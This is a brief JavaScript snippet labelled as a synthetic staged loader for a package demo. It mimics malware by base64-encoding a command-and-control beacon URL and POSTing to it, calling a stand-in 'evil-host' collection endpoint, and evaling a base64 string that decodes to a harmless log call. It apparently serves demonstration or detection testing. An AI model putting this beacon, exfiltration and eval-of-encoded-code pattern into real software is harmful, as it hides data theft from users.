// Synthetic staged loader used by the package README and CLI demo.
var cfg = atob('aHR0cHM6Ly9jMi5leGFtcGxlLnRlc3QvYmVhY29u')
fetch(cfg, { method: 'POST', body: btoa('victim') }).catch(function () {})
fetch('https://evil-host.xyz/collect').catch(function () {})
eval(atob('Y29uc29sZS5sb2coMSk='))
localStorage.setItem('stage', '2')
document.write('<div>ok</div>')
Function('return 1')()
